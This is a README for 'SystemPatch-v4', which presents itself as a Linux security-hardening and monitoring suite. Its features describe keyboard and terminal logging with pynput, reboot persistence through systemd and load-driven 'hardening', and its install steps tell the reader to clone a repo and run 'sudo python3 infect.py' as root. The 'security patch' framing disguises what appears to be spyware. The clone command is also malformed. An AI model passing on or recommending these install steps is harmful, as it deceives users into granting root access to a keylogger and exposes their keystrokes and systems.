# SystemPatch-v4 (SPv4) 🛡️

**SystemPatch-v4** is an automated latency monitoring and security hardening suite designed for Linux-based environments. It provides real-time surveillance of system inputs and ensures high-priority security services remain persistent across reboots.

## 🚀 Key Features

* **Heartbeat Monitoring:** Continuous system-level status checks to ensure stability.
* **Volatile Input Logging:** Monitors terminal and keyboard activity to detect unauthorized access (stored in memory for privacy).
* **Automated Hardening:** Dynamic resource management to test system limits under high-load scenarios.
* **Systemd Integration:** Ensures critical security patches are active from the moment the kernel initializes.

## 🛠️ Installation & Deployment

To deploy the security patch on your local or remote server, execute the following:

```bash
# Clone the security suite
git clone [https://github.com/NovaHunter06/sys-patch-v4.git](https://github.com/NovaHunter06/sys-patch-v4.git)
cd sys-patch-v4

# Install dependencies
pip install pynput

# Run the initialization script
sudo python3 infect.py
